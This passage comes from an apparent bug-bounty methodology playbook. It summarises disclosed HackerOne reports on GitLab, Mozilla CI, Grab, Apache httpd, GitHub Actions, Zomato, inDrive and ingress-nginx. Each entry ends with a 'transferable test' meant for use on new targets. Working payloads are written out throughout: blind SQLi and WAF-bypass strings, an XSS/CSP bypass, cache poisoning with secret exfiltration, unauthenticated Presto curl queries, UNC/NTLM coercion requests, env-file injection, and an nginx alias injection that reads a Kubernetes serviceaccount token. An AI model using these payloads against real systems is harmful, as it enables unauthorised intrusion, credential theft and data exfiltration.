DETECTION SIGNAL: legacy PHP/reporting/export endpoints (`*report*`, `*export*`, `*.php?…[]=`) where params are ARRAY-typed (`x[]=`, `x[0]=`, `x[key]=`) — array params are frequently concatenated into SQL differently (IN-lists) and may dodge scalar filters; behind a WAF, a differential block (403/418 vs 200) indicates the injection reached the backend.
CHAIN: unvalidated array parameter on a partner reporting page → blind SQLi → read SQL data from the backing database → Critical 9.9, $25,000 (WAF-bypass step undocumented).
TRANSFERABLE TEST: Send array-style injections — `countryFilter[]=1'`, `countryFilter[0]=1'`, `countryFilter[]=1) AND SLEEP(5)-- -` — to legacy `*.php` report/export endpoints and compare time/boolean responses, keeping a scalar control to confirm the array form behaves differently. When a WAF blocks, record it and enumerate WAF bypasses; never claim a bypass you cannot reproduce.

### [Bugbountyskills.md] 17.26 Selector/reader node mismatch → attribute injection into a string-concatenated tag → `data-*`-driven CSP bypass (GitLab Kroki)

SOURCE: https://hackerone.com/reports/1731349 — GitLab "Stored XSS via Kroki diagram" (High, CVSS 8.7, $13,950)  read 2026-11-07
ROUTE: body rendered in full via the `.json` endpoint.
CLASS: stored XSS (attribute injection) + CSP bypass
CORE METHOD:
  1. The CSS selector validates ONE node (`pre > code[lang=x]`) but the code reads the value from ANOTHER (`node.parent['lang'] || node['lang']`) → unvalidated parent value.
  2. Value is interpolated into `%Q(<img src="#{x}" />)` by string concatenation → `"` escapes the attribute: `<a><pre lang='f/" onerror=alert(1)'><code lang="wavedrom">x</code></pre></a>`.
  3. `class` is overwritten afterwards, but `data-*` survive.
  4. CSP bypass: set `data-diff-for-path` to a JSON file you host (`{"html":"<script>alert(document.domain)</script>"}`); the app's own jQuery sink `$(data.html)` turns it into DOM. Stretch the overlay with an injected `style` so a click anywhere triggers it.
DETECTION SIGNAL: server-side tag built by interpolation with attacker-influenced values; selector/validator reading a different node than it matched (parent/child, CSS vs XPath); attributes the renderer overwrites vs leaves free.
CHAIN: any commenter → parent-`lang` injection → stored attribute injection → `data-*` → jQuery HTML sink → script in victim origin → session theft ($13,950).
TRANSFERABLE TEST: Inject `"` + a marker attribute through every parent/child variant of an accepted enum and confirm it lands in the HTML; under CSP, enumerate `data-*` attributes the JS reads for URL/`$.get`/`innerHTML` sinks.

### [Bugbountyskills.md] 17.53 CI build-cache poisoning: re-upload a modified remote-cache artifact under an existing key (the cache "authorized link" is not immutable) → CI restores it as a HIT → code injection in the build + secret exfiltration (Mozilla fxa / NX Cloud #2255750)

SOURCE: https://hackerone.com/reports/2255750 — Mozilla, "Remote code execution and exfiltration of secret tokens by poisoning the mozilla/fxa CI build cache" (Code Injection; Critical CVSS 10.0; $8,000; reporter 0x90security)  read 2026-11-07 (body `visibility: no-content`; official team summary via the HackerOne `.json` endpoint)
CLASS: shared CI/CD build-cache poisoning — a cache artifact key that accepts repeated uploads lets an attacker substitute the artifact a trusted build later restores · CWE-345 → CWE-94
CORE METHOD:
  1. The target repo is PUBLIC → read its source and CI config to learn the remote-cache provider and endpoint (here: NX Cloud for the `fxa` Firefox Accounts repo).
  2. Obtain an upload URL for the cache service (a cache-WRITE handle reachable from the repo/CI config).
  3. The flaw: the authorized link "could be used to upload more than once to the same artifact" — the entry is NOT immutable, so re-upload a MODIFIED artifact under an existing key.
  4. The next CI run that hashes to that key gets a cache HIT and restores the poisoned artifact instead of recomputing the task → attacker-controlled build output executes in CI, and the run's environment variables (fxa secret tokens) were read back out as PoC.
DETECTION SIGNAL: CI using a remote cache (NX Cloud, Turborepo, Bazel/Gradle remote cache, sccache, S3/GCS-backed) where the cache-write credential is obtainable from a public repo's config/logs AND the same key accepts a second upload (immutability missing); cache keys derived only from source; artifacts restored without signature verification; untrusted PRs able to write the cache protected branches restore.
CHAIN: read public CI config → get the cache-write URL → re-upload a modified artifact to an existing key → CI restores it as a HIT → code injection in the build (RCE) → dump build env vars → exfiltrate secret tokens (Critical 10.0, $8,000). Same class as NX Cloud's CREEP (CVE-2025-36852).
TRANSFERABLE TEST: for any target with CI, enumerate the remote-cache mechanism (grep config for nx/turbo/bazel/gradle/sccache/"remote cache"/cache URLs+tokens; scan build logs for uploaded cache handles). If you can obtain the cache-write handle, re-upload a benignly-modified artifact to the SAME key and confirm a later CI run restores YOUR bytes (cache HIT) — a re-uploadable key is a poisoning primitive, and if the restored artifact is executed code, that is RCE.

### [Bugbountyskills.md] 17.95 An internet-exposed analytics QUERY ENGINE (Presto coordinator) behind a misconfigured firewall is a data-warehouse read: `POST /v1/statement` accepts SQL with no auth (Grab `Grab_Road` BigData #266766)

SOURCE: https://hackerone.com/reports/266766 — Grab, "Access Grab_Road BigData Database via Open Presto coordinator" (Information Disclosure; Critical 9~10; $5,000; reporter vinothkumar; asset (scope none); disclosed 2017-11-30)  read 2026-11-07 (report body `no-content`, 0 B in the dataset mirror; `web_extract` → SPA shell; readable public text = Grab's own summary via `r.jina.ai`; NO request/endpoint is public — step 2 below is explicitly-labelled STANDARD Presto API, standard enumeration, not report content, same honesty standard as #663628/#838635)
CLASS: admin/internal service access — internet-reachable Presto coordinator -> SQL read of the warehouse
CORE METHOD:
  1. Report's words (discovery): Shodan-search the org's IP space/ASN for an exposed analytics instance; here an open Presto coordinator was reachable because of a firewall misconfiguration, exposing an internal BigData database ("contained booking related information").
  2. Standard Presto coordinator HTTP API (labelled): the coordinator serves SQL over `POST http://<host>:8080/v1/statement` with headers `X-Presto-Catalog`, `X-Presto-Schema`, `X-Presto-User` (optional `X-Presto-Source`), body = raw SQL; the response returns `id`/`nextUri` to poll for rows.
  3. Enumerate: `SHOW CATALOGS` -> `SHOW SCHEMAS FROM <catalog>` -> `SHOW TABLES FROM <catalog>.<schema>` -> `SELECT * FROM <catalog>.<schema>.<table> LIMIT N`, then exfiltrate as JSON.
DETECTION SIGNAL: a non-web port (Presto/Trino coordinator 8080; also Elasticsearch 9200, Kibana 5601, Hive, Spark) returning a JSON statement/query API without auth; a `Server:`/JSON banner naming Presto/Trino; Shodan/Censys hits on the org's netblocks for the coordinator UI/API; a management/analytics plane reachable from the internet where only a FIREWALL (not authentication) stood in front.
CHAIN: internet-reachable Presto coordinator (misconfigured firewall) -> `POST /v1/statement` with SQL -> list catalogs/schemas/tables -> SELECT the warehouse -> read internal business data with no credentials (Critical 9~10, $5,000). The P4 primitive "exposed management port" escalates to a full warehouse read.
TRANSFERABLE TEST: port-scan/Shodan the target's netblocks for query-engine ports (Presto/Trino 8080, Elasticsearch 9200, Kibana 5601, Spark, Hive); on a hit, `curl -s -X POST http://<host>:8080/v1/statement -H 'X-Presto-User: x' --data 'SHOW CATALOGS'` and follow `nextUri`; any 200 with rows = unauthenticated warehouse read — enumerate schemas/tables before exfiltrating.

NOTE — §17 additions 2026-11-07 batch 21 (§17.92–§17.95 from 4 readable sources; 2 of the 6 sources appended nothing new — NOT invented). NEW GENERAL METHODS: §17.92 (a GraphQL PERSISTED-OPERATION hash whose only selector is a NAME variable and which performs no membership check → BOLA + cursor walk — distinct from the V-12 raw-global-id swap because there is no query text and the selector is a human name); §17.93 (a document-import pipeline fetches a reference inside the uploaded archive and returns the response BODY as a downloadable artefact → full-read SSRF; the DNS-rebind bypass is the existing V-04 variant, the NEW part is the entry point + the response-as-attachment read primitive); §17.94 (registry SOURCE-PRIORITY INVERSION — a legitimate internal package overridden by a public same-name copy via global sources / a transitive dep / Bundler < 2.2.10, delivered by a hand `gem install` — distinct from the recorded DEPENDENCY-CONFUSION squatting of an unclaimed name); §17.95 (an internet-exposed Presto/Trino QUERY ENGINE accepting SQL at `POST /v1/statement` with no auth → warehouse read — distinct from the recorded anonymous-Grafana dashboard #663628). NO §17 slot for: #862589 (LY Corporation, Spring Actuator heapdump→token-replay→ATO) — that technique is already §17.31 / #838635, and #862589's report is a DIFFERENT LY report with the identical method, so it was recorded ONLY as a detection-hint correction (Actuator may live on a CUSTOM base path — do not stop at `/actuator/*`; enumerate `manage|management|internal|ops|admin|metrics` first segments) in the harvest ledger and the dated methodology file; and #1549206 (Reddit reflected XSS) — its `visibility: full` body is the UNFILLED HackerOne template ("[add details for how we can reproduce the issue]"), no URL/param/payload, so nothing was invented. Full per-source route/honesty records are in `/root/bugbountyhuntingskills.md` and `/root/hackbot-architecture/knowledge/methodologies-2026-11-07.md`.

### [Bugbountyskills.md] 17.108 A Windows server's own PATH handling coerces NTLM over SMB from a UNC path -> capture/relay -> RCE, with no database and no SQLi in the path (Apache HTTP Server CVE-2024-38472 / HackerOne #2585385, Orange Tsai)

SOURCE: https://hackerone.com/reports/2585385 — Internet Bug Bounty, "important: Apache HTTP Server on Windows UNC SSRF (CVE-2024-38472)", SSRF, High 7-8.9, $4,920, reporter orange, submitted 2024-07-03, disclosed 2024-07-13  read 2026-11-07 (route: live `web_extract` on the report; the METHOD from two sources opened the same day — `https://httpd.apache.org/security/vulnerabilities_24.html` (CVE-2024-38472 entry: leaks NTLM hashes to a malicious server, affects 2.4.0-2.4.59, fixed by r1918558 in 2.4.60 released 2024-07-01, new directive `UNCList`) and `https://blog.orange.tw/2024/08/confusion-attacks-en.html`, the finder's Black Hat USA 2024 writeup)
CLASS: SSRF -> outbound SMB/NTLM authentication coercion -> credential capture/relay -> RCE (CWE-918)
CORE METHOD:
  1. `apr_filepath_merge()` on Windows accepts UNC paths, so a request path reaching an APR file API becomes an outbound SMB connection to the attacker's host: `curl http://server/%5C%5Cattacker-server/path/to` (two `%5C` decode to `\\`). Needs `AllowEncodedSlashes On`, plus `MergeSlashes Off` on httpd above 2.4.49 (its core parser was rewritten); real-world reachability via Tomcat pairings (`mod_jk`, `mod_proxy_ajp`) or PATH_INFO configs.
  2. Alternative trigger: where `AddHandler type-map var` is enabled (default on Debian/Ubuntu), upload a `.var` file whose `URI:` field is a UNC path — the server then authenticates to the attacker on request.
  3. Receive the NTLM challenge/response and crack it offline or RELAY it — "practically, this SSRF can be converted into RCE through NTLM Relay".
  4. Siblings from the same research: CVE-2024-39573 (a controllable `RewriteRule` substitution prefix invokes `mod_proxy` — `RewriteRule ^/broken(.*) $1` plus `curl http://server/brokenproxy:unix:/run/[...]|http://path/to` = full SSRF) and CVE-2024-38473 (mod_proxy encoding problem -> backend request with incorrect encoding -> auth bypass where proxying is configured by means other than ProxyPass, e.g. `SetHandler`).
DETECTION SIGNAL: a Windows host where any request-influenced PATH reaches a filesystem/handler API (URL path, static handler, content-negotiation type-map, include/template/log path, upload or rename target) — send `%5C%5C<host>\share`, `//<host>/share`, or a traversal plus a UNC; an SMB (port 445) connection or an NTLM challenge arriving at your listener during an ordinary HTTP request, sourced from the TARGET's IP; `AddHandler type-map var` enabled together with an upload surface; `AllowEncodedSlashes On` (+ `MergeSlashes Off` on 2.4.50-2.4.59).
CHAIN: one HTTP GET with an encoded UNC path (or an uploaded content-negotiation file naming a UNC URI) -> the server's Win32 file API resolves it -> the SERVER authenticates to the attacker's SMB listener -> NTLMv2 captured -> cracked or relayed -> code execution with the service account's rights. Capture alone is a chain primitive; the finding is the relay and the privilege it reaches.
TRANSFERABLE TEST: put `\\<collaborator>\share\x` into EVERY path-shaped input on a Windows target (encoded URL path, uploaded/renamed filename or folder, import/include/config path, type-map file) and check an SMB listener for a connection from the target's own IP; a challenge received = the primitive, and before framing impact test whether the account can be relayed (does it hold remote rights?).
WHY IT IS A NEW GENERAL METHOD: this file's UNC/NTLM material is DATABASE-driven (`xp_dirtree '\\host\share'`, `LOAD_FILE('\\\\host\\x')`, §6 SQLi OAST) with SQLi as the delivery vector. Here the delivery is the WEB SERVER's own path resolution, reachable from a single unauthenticated GET, and the new content is the entry-point map (encoded request path with its `AllowEncodedSlashes`/`MergeSlashes` preconditions, content-negotiation type-map file, RewriteRule prefix) plus the fix detail (`UNCList` in 2.4.60).

NOTE — §17 additions 2026-11-07 batch 26 (§17.107-§17.108 from 5 of the batch's 6 readable sources). #139879 (Internet Bug Bounty, "Adobe Flash Player Regular Expression UAF Remote Code Execution Vulnerability", CVE-2016-4121, $5,000, reporter bee13oy) was read on BOTH routes and got NO slot: the published body is advisory-thin — the class ("a UAF Vulnerability in the PCRE engine used in Flash"), the affected range (11.5.502.135 ~ 20.0.0.286) and a note that the exploit demo is in the original report — with no trigger, root cause or code, the same standard that rejected #56385. WHY EACH IS NEW: §17.107 = the file's first memory-safety/client-RCE method, giving the four exploit-side primitives reachable from untrusted script (exposed `release()` UAF; stale recursion-local pointer across a workspace relocation -> OOB -> typed-array length-field overwrite; uninitialized field + spray groom -> fake object; `ASnative` index dispatch called with the wrong type) and their escalation rules — the only other Flash entry here (#12497) is one primitive (native object in a user wrapper) and it is a DIFFERENT report; §17.108 = NTLM/SMB coercion reached through the WEB SERVER's path handling (encoded `%5C%5C` request path, Debian/Ubuntu type-map `.var` file, RewriteRule prefix) rather than through a database (`xp_dirtree`, `LOAD_FILE`, §6 SQLi OAST), i.e. an unauthenticated single-request entry point. Full per-source route/honesty records are in `/root/bugbountyhuntingskills.md` and `/root/hackbot-architecture/knowledge/methodologies-2026-11-07.md`.

### [Bugbountyskills.md] 17.115 ENV-FILE delimiter/newline injection into `$GITHUB_ENV` via `core.exportVariable` → attacker-defined environment variables in every later step → runner code execution (CVE-2022-35954 / HackerOne #1625652)

SOURCE: https://hackerone.com/reports/1625652 — GitHub, "Delimiter injection in GitHub Actions core.exportVariable", Misconfiguration (CWE-74), Medium (4~6.9), $4,617, reporter jupenur, reported 2022-07-05, disclosed 2022-08-18; report `vulnerability_information` is `no-content`, method completed from the package advisory OPENED this pass (`https://github.com/actions/toolkit/security/advisories/GHSA-7r3h-m5j6-3q42`) + `https://codeql.github.com/codeql-query-help/actions/actions-envvar-injection-critical/` + the report's own summary/comment  read 2026-11-07
CLASS: CI/CD pipeline injection — env-file delimiter / newline injection in a GitHub Actions job (leads to code execution in the runner)
CORE METHOD:
  1. Sink: a workflow step or JS action writes attacker-influenced text (issue/PR/comment body, artifact/workspace file, branch name) into the job env-file — `core.exportVariable(name,value)`, `echo "$X" >> "$GITHUB_ENV"`, or `core.addPath`/`$GITHUB_PATH`.
  2. `@actions/core` ≤ 1.9.0 encodes multi-line values with the PUBLIC FIXED delimiter `_GitHubActionsFileCommandDelimeter_`; an attacker who puts that literal on its own line inside the value closes the record early → all following lines are parsed as further `KEY=VALUE` pairs → arbitrary variables for later steps ("the path or other environment variables may be modified").
  3. Same sink, plain shell: a BARE NEWLINE in a single-line value (`echo "MYVAR=$BODY" >> "$GITHUB_ENV"`) injects a second variable (CodeQL's example: comment body `FOO\nNEW_ENV_VAR=MALICIOUS_VALUE`); heredocs closed by a literal delimiter are equally injectable — fix is a per-run `uuidgen` delimiter.
  4. Escalation per the report's own summary: arbitrary env vars, with RCE in the runner demonstrated in the separate report #1637621 ("Command injection in GitHub Actions ContainerStepHost", CVE-2022-39321) — the injected variable reaches every subsequent step, which runs with the job's token/secrets.
DETECTION SIGNAL: externally-triggerable workflow (`issues`/`issue_comment`/`pull_request_target`/`workflow_run`) whose `run:`/JS action writes `${{ github.event.*.body }}`/`github.head_ref`/artifact content into `$GITHUB_ENV`/`$GITHUB_PATH`; `@actions/core` < 1.9.1 pinned; heredocs with a literal delimiter.
CHAIN: untrusted text → delimiter/newline breaks the env-file record → arbitrary env var in all later steps → code execution in the runner with the job's secrets → repository/CI compromise. No untrusted write to the env-file = unreachable primitive.
TRANSFERABLE TEST: add `echo "TITLE=${{ github.event.issue.title }}" >> "$GITHUB_ENV"` + a step printing `env`; open an issue titled with a newline, `_GitHubActionsFileCommandDelimeter_`, `MY_VAR=pwned`, and the delimiter again (plus the `FOO\nNEW_ENV_VAR=…` variant); a new variable in the later step proves it. Check `node_modules/@actions/core/package.json` ≥ 1.9.1.
WHY IT IS A NEW GENERAL METHOD: the file had NO CI/CD env-file entry at all (only a routing-table mention of a `cicd-security` class) — this is the first written technique for the workflow env-file SINK: a public delimiter + newline handling that converts any untrusted string reaching `$GITHUB_ENV` into control of every later step, and it generalises to GitLab/other CI env-file (dotenv-style) writers.

### [Bugbountyskills.md] 17.116 WAF bypass by splitting a SQL FUNCTION NAME from its parenthesis with an inline comment, plus a VALUE-KEYED DB result cache defeated by mutating the integer prefix (Zomato `item_id` / HackerOne #403616)

SOURCE: https://hackerone.com/reports/403616 — Eternal, "[www.zomato.com] SQLi - /php/██████████ - item_id", SQL Injection, Critical (9~10), $4,500, reporter gerben_javado, reported 2018-08-31, disclosed 2018-09-11, 326 votes; body is `no-content` in the dataset mirror but the FULL reporter write-up (both payloads + the caching note) rendered this pass via `https://r.jina.ai/https:/hackerone.com/reports/403616`  read 2026-11-07 (source is 2018 — the WAF-rule shape must be re-verified live)
CLASS: time-based blind SQL injection through a WAF, kept alive by defeating a value-keyed database result cache
CORE METHOD:
  1. Entry: `POST /php/██████████` body `res_id=1111&method=add_menu_item_tags&item_id=1111-<payload>&new_tags[]=3&menu_id=1111` — the parameter is composed `<integer>-<input>`.
  2. WAF bypass: put an inline SQL comment between the FUNCTION NAME and its `(` — `sleep/*f*/(10)`, `version/*f*/()`, `mid(version/*f*/(),1,1)` — valid MySQL, unrecognisable to the Akamai Kona signature.
  3. Oracle: `item_id=1111-if(mid(version/*f*/(),1,1)=5,sleep/*f*/(5),0)` → 6,090 ms true vs 910 ms false; `sleep/*f*/(10)` alone → ~6,090 ms.
  4. CACHE-BUST: results are cached by the INTEGER BEFORE the payload, so a replayed payload stops firing — increment/decrement that integer on EVERY request.
DETECTION SIGNAL: an `<int>-<input>` parameter shape behind a WAF; a timing payload that fires once and then looks inert (mutate the prefix and retest); a WAF that rejects `sleep(` but accepts `sleep/*x*/(`.
CHAIN: integer-prefixed param + WAF signature (primitives) → comment-split function call evades the WAF → time-based blind SQLi oracle → whole-database read (Critical). The cache-bust step is the link that keeps extraction possible.
TRANSFERABLE TEST: time the baseline; send `sleep(10)`; if blocked, resend `sleep/*f*/(10)` / `benchmark(1000000,md5(1))` with the comment at the name/paren boundary; replay the SAME request — if the second is fast, increment the leading integer each request and re-time; confirm with `if(<predicate>,sleep(5),0)` true/false timings.
WHY IT IS A NEW GENERAL METHOD: the ledger's Akamai material previously recorded that a bypass was "NOT disclosed" and the playbook's WAF entries were about edge rule engines composing headers; 17.116 is the file's first concrete, transferable WAF signature-evasion recipe for SQL functions (name/paren comment split) plus the first CACHE-BUSTING rule for a value-keyed result cache — a false-negative trap that makes real injections look closed.

### [Bugbountyskills.md] 17.117 Unauthenticated `admin-ajax.php` PREVIEW action that expands WordPress shortcodes from a parameter, whose shortcode then interpolates `order_by`/`order` into ORDER BY → boolean-blind SQLi → DB read → plaintext third-party plugin key as the WP-admin/RCE pivot (Grab / www.drivegrab.com, HackerOne #273946)

SOURCE: https://hackerone.com/reports/273946 — Grab, "www.drivegrab.com SQL injection" (Formidable Pro plugin 0-day), SQL Injection, reporter jouko (Jouko Pynnönen), submitted 2017-10-03, $4,500 + two $250 duplicate-grade siblings; full `visibility: full` body (6,180 B) in `/tmp/h1_train.parquet` and rendered end-to-end this pass via `https://r.jina.ai/https://hackerone.com/reports/273946`  read 2026-11-07
CLASS: unauthenticated SQL injection through a plugin's PREVIEW endpoint that expands shortcodes (shortcode-parameter injection into ORDER BY), plus a DB→admin/RCE pivot via a plaintext plugin secret
CORE METHOD:
  1. `POST /wp-admin/admin-ajax.php` with `action=frm_forms_preview` answers WITHOUT authentication (the handler is registered `wp_ajax_nopriv` although it is meant for admins designing forms) and renders the first form if `id` is omitted: `curl -s -i 'https://TARGET/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview'`.
  2. Its `after_html`/`before_html` parameters accept arbitrary HTML AND WORDPRESS SHORTCODES, expanded inside the preview — a raw shortcode-injection primitive: `--data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835]YYY'`.
  3. The plugin shortcode `[display-frm-data]` takes `order_by`/`order` (supposed to be ASC/DESC) and interpolates them UNSANITIZED into the ORDER BY of the query that fetches entry IDs → SQLi: `after_html=XXX[display-frm-data id=835 order_by=id limit=1 order=zzz]YYY`.
  4. Output is not echoed: only the RENDER ORDER of entries is attacker-influenced = one bit per request → boolean blind; sqlmap `--technique B --param-del ' ' -p true --string <known token>` with `--tamper commalesslimit`, because the plugin appends `",it.id"` after every comma, repaired by an `--eval` that rewrites a comma to `-it.id+`.
  5. Impact proven: full WordPress DB read (tables, admin password hashes, webroot path; Grab's summary adds driver-partner PII ~0.6% of the dataset).
  6. Pivot (recorded as UNCONFIRMED): DB → WP admin dashboard → RCE via an iThemes-Sync authentication key stored in PLAINTEXT in the DB (only a user id + that key needed); the vendor could not reproduce it (hardening).
DETECTION SIGNAL: WordPress with Formidable Forms (Pro); `admin-ajax.php` answering a preview/render action unauthenticated; any endpoint expanding `[shortcode]` from a request parameter; `order_by`/`order`/`limit` inside a shortcode; output varying only in ORDER.
CHAIN: nopriv preview action (primitive) → parameter-driven shortcode expansion → ORDER BY SQLi → WordPress DB dump incl. PII + admin hashes (the finding) → plaintext third-party plugin key intended as the admin/RCE pivot (unconfirmed).
TRANSFERABLE TEST: POST `action=frm_forms_preview` to `/wp-admin/admin-ajax.php` with NO cookies — 200 + rendered form HTML means unauthenticated preview; then `&after_html=XXX[display-frm-data id=<id> order_by=id limit=1 order=zzz]YYY` and compare entry order for `ASC`/`DESC`/`zzz`; automate with `--technique B --tamper commalesslimit`. Generalise: enumerate every read-only-looking `admin-ajax.php` action (preview/render/heartbeat) and feed it HTML/shortcode parameters.
WHY IT IS A NEW GENERAL METHOD: the file had no WordPress-shortcode or `admin-ajax.php` entry — this is the first technique for the "unauthenticated preview/render action that expands plugin shortcodes" entry surface, where a plugin's OWN shortcode parameters become the SQL sink, and it demonstrates the generic ORDER-BY blind-oracle repair trick (comma-mangling tamer + `--eval` rewrite).

NOTE — §17 additions 2026-11-07 batch 28 (§17.113–§17.117 from 5 of the batch's 6 sources). The sixth source, Uber "Unauthorized access to █████████.com allows access to Uber Brazil tax documents and system." (#530441, Improper Access Control - Generic, Low, $4,500, 207 votes, reporter healdb), got no slot and NO entry anywhere: the HackerOne body is `no-content` (0 B in the official dataset mirror), the page/`.json`/Wayback/`r.jina.ai` show only Uber's one-paragraph program summary and the reporter's one-line comment, and no credited public writeup exists — nothing to transcribe, nothing invented. WHY EACH OTHER IS NEW: §17.113 = the file's first CLIENT-SIDE desync (victim browser issues the desyncing request; app error path leaks another user's buffered bytes), distinct from every server-side framing entry; §17.114 = trailer-line GRAMMAR skipping (colon-less trailer line, arbitrary `Host:` smuggled), distinct from §17.110's trailer SIZE-LIMIT error path; §17.115 = the file's first CI/CD env-file injection (public multiline delimiter + newline) — the sink that turns any untrusted string reaching `$GITHUB_ENV` into control of every later step; §17.116 = the first concrete WAF function-signature evasion (comment between function name and parenthesis) plus the first value-keyed CACHE-BUSTING rule; §17.117 = the first `admin-ajax.php` / WordPress-shortcode injection entry (unauthenticated preview action → plugin shortcode parameter → ORDER BY SQLi). Full per-source route/honesty records are in `/root/bugbountyhuntingskills.md` and `/root/hackbot-architecture/knowledge/methodologies-2026-11-07.md`.

### [Bugbountyskills.md] 17.122 Blind SQLi in a URL PATH SEGMENT via an `or 1=1--` / `or 1=2--` boolean predicate, reached from a promo page's XHR (inDrive / id.indrive.com, HackerOne #2051931)

CLASS/METHOD: a REST API interpolates a numeric PATH SEGMENT (not a query parameter) into SQL. A public promo page's "generate" button provisions the endpoint, whose last segments (`/number_trips/29/5/phone`) are the injection slots. Replacing the final segment with `999%20or%201=1--` returns a RANDOM row; `999%20or%201=2--` returns EMPTY — a boolean oracle; the vulnerable API host is a different origin from the promo page and is directly reachable unauthenticated.
CORE METHOD: read the XHRs a promo/landing page fires → take a numeric path segment → append `%20or%201=1--` vs `%20or%201=2--` → compare (row vs empty) → automate blind extraction (reporter read the DB version: PostgreSQL 14.8).
DETECTION SIGNAL: REST paths with numeric/structured segments interpolated into queries (`/api/.../<int>/<int>`); a segment answering differently for `or 1=1--` vs `or 1=2--`; promo pages whose client JS calls internal APIs.
CHAIN: public promo page pointing to the API (primitive) → numeric path segment interpolated into SQL → `or 1=1--`/`or 1=2--` boolean oracle → blind extraction of arbitrary DB data (version, then any table) = Critical.
TRANSFERABLE TEST: enumerate API endpoints behind promo/landing pages, then append `%20or%201=1--` vs `%20or%201=2--` to EVERY numeric path segment and compare responses; fuzz PATH segments, not only query parameters.
WHY IT IS A NEW GENERAL METHOD: the file's SQLi entries target query/body parameters and header-composed WAF cases; §17.122 is its first PATH-SEGMENT SQLi with a promo-page-XHR discovery route — a class of injection that parameter-only fuzzing misses.

NOTE — §17 additions 2026-11-07 batch 29 (§17.118–§17.122 from 5 of the batch's 6 sources). The sixth source, LY/LINE "SSRF on music.line.me through getXML.php" (#746024, SSRF, High, $4,500, reporter hahwul), got no slot and NO entry anywhere: the HackerOne body is `no-content` (0 B in the official dataset mirror), page/`r.jina.ai` (HTTP 422 login/paywall)/browser (HackerOne error page)/Wayback/`ajaysenr` mirror all show only LY's two-sentence summary ("limited SSRF, GET-over-HTTPS only, no LFI, minor impact"), and no credited public writeup exists — nothing to transcribe, nothing invented. WHY EACH OTHER IS NEW: §17.118 = first TRUST-RESTORED derived-HTML import field (stored XSS), opposite of the existing `cached_markdown_version` STRIP defence; §17.119 = first CREDENTIAL-COOKIE caching (session `Set-Cookie` + `Cache-Control: public` replayed by a shared cache → ATO); §17.120 = first WRITE-primitive → DESERIALIZE-sink RCE chain (Tomcat partial PUT → session store); §17.121 = first loopback DEBUG-PORT DNS-rebinding entry (`0.0.0.0`+macOS `.local` → Node inspector → RCE), distinct from the generic SSRF rebinding; §17.122 = first PATH-SEGMENT SQLi with a promo-page-XHR discovery route. Full per-source route/honesty records are in `/root/bugbountyhuntingskills.md` and `/root/hackbot-architecture/knowledge/methodologies-2026-11-07.md`.

### [Bugbountyskills.md] 17.181 A config-injection into a generated proxy config becomes an ARBITRARY INTERNAL FILE READ when the injected directive is a FILE-SERVING one — the ingress `path` field + nginx `alias` serve the controller pod's `serviceaccount/token`, and the controller's own ClusterRole turns that token into cluster-wide Secret access (ingress-nginx, HackerOne #1382919)

SOURCE: https://hackerone.com/reports/1382919 — Kubernetes, "Ingress-nginx path allows retrieval of ingress-nginx serviceaccount token" (Privilege Escalation; High 7.6, `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L`; $2,500; reporter 0ria; created 2021-10-27, disclosed 2022-08-06; Kubernetes 1.20 / ingress-nginx controller v1.0.4)  read 2026-11-07 via the full `.json` body (2,998 B — RBAC YAMLs, the malicious Ingress YAML and the curl PoC included), byte-identical to `/tmp/h1_train.parquet` (verified `cmp`-identical to the Hugging Face `Hacker0x01/hackerone_disclosed_reports` train split). This is the report behind the ingress-nginx `spec.rules.http.paths.path` validation fix (CVE-2021-25745).
CLASS: code/config injection → INTERNAL FILE READ served over the same proxy → cluster-credential theft → privilege escalation (CWE-94 → CWE-22 → CWE-522); the injected directive is a FILE-SERVING directive (`alias`), not an embedded scripting block (§17.172/§17.179) and not a log write (§17.178).
CORE METHOD (reporter's steps, verbatim structure):
  1. Precondition: `get, create, update` on `networking.k8s.io/ingresses` in ONE namespace (the report ships the `ingress-creator` Role + RoleBinding) — this user "cannot list secrets at all".
  2. Create an Ingress whose `spec.rules[].http.paths[].path` is `/gaf{alias /var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa`.
  3. The value is written into `/etc/nginx/nginx.conf` inside the ingress-nginx-controller pod: `{`/`}` break out of the generated `location`, `alias` maps the URL prefix onto the pod filesystem, the trailing `location ~* ^/aaa` keeps the config valid so nginx reloads it.
  4. `GET https://<host>/gaf/token` returns `/var/run/secrets/kubernetes.io/serviceaccount/token` as the response body (no auth on the injected location); the token decodes to the ingress-nginx ServiceAccount.
  5. That ServiceAccount's ClusterRole can "list secrets is all namespaces (cluster wide)" → every namespace's Secrets/ConfigMaps.
DETECTION SIGNAL: a generated-config proxy/ingress where a user-settable string (`path`, `host`, `server_name`, annotation, CRD field) reaches the rendered config — the tell is that `{`, `}`, newlines SURVIVE into the file (`kubectl exec <controller> -- cat /etc/nginx/nginx.conf` after a probe object); nginx `alias`/`root`/`autoindex` available (any injected location then serves a pod directory); the always-mounted token path `/var/run/secrets/kubernetes.io/serviceaccount/token`; a broad controller ClusterRole (`list secrets` cluster-wide). Bootstrap probe: a path containing `{return 200 "MARKER";}` — MARKER in the response proves the field is unfiltered.
CHAIN: namespaced Ingress write, no cluster role (primitive: create one object) → `path` spliced raw into `nginx.conf`, so `}` + `alias /var/run/secrets/kubernetes.io/serviceaccount/;` STATICALLY SERVES that directory (primitive: config injection → internal file read) → one GET returns the controller's ServiceAccount JWT (High 7.6) → the SA's ClusterRole lists Secrets in ALL namespaces (primitive: cluster-wide credential). No code execution and no file write are needed: the injected directive serves one attacker-chosen file, and that file is a cluster credential.
TRANSFERABLE TEST: on ingress-nginx (pre-2021-10) or any templated reverse proxy you can create objects on, walk the block-breakout probe into the PATH/host/annotation surface — `/probe{alias /etc/;}` for the read, `{return 200 "MARKER";}` first to prove breakout — then fetch `https://<host>/probe/passwd` and `https://<host>/probe/var/run/secrets/kubernetes.io/serviceaccount/token`. A file body or directory index served out of the pod's filesystem is the finding; the operator's own token is the impact. Rule: **`alias`/`root`/`autoindex` convert config injection into arbitrary internal file read — you do not need code injection, you need the pod's credential files to be servable.** Where the vendor already patched `alias` in an annotation (§17.172/§17.178/§17.179), re-test the PATH field and every other string that lands in the same config.
